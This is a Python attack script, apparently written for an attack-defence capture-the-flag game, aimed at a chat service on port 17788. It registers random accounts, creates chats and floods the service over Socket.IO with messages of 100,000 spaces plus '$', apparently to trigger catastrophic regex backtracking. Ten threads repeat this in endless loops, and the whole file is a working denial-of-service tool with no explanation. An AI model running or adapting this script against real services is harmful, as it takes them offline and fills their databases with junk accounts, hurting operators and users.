import socketio
import re
import requests
import sys
from checklib import *
import threading


sio = socketio.SimpleClient()
session = requests.Session()

IP = sys.argv[1]
PORT = 17788


def login(usr: str, pas: str):
    session.post(f'http://{IP}:{PORT}/login', data={
        'username': usr,
        'password': pas,
        'action':'signup'

    })
    session.post(f'http://{IP}:{PORT}/login', data={
        'username': usr,
        'password': pas,
        'action':'signin'

    })
    return session


def create_chat(sess: requests.Session):
    chat_uuid = sess.post(f'http://{IP}:{PORT}/api/chat/create', json={'chat_name':rnd_string(6)})
    return chat_uuid.json()['chat_id']

def attack(cookie: str, chat_uuid: str):
    try:
        sio.connect(f'http://{IP}:{PORT}', headers={'Cookie':f'session={cookie}'}, wait_timeout=30)
        sio.emit('join_room', {'chat_id': chat_uuid})
        sio.emit('send_message', {'chat_id': chat_uuid, 'message':' '*100000+'$'})

        event = sio.receive()
        sio.disconnect()
    except:
        pass


def run_attack():
    while True:
        sess = login(rnd_username(), rnd_password())
        chat_id = create_chat(sess)
        attack(sess.cookies.get_dict()['session'], chat_id)

num_threads = 10
threads = []
for _ in range(num_threads):
    t = threading.Thread(target=run_attack)
    threads.append(t)
    t.start()

for t in threads:
    t.join()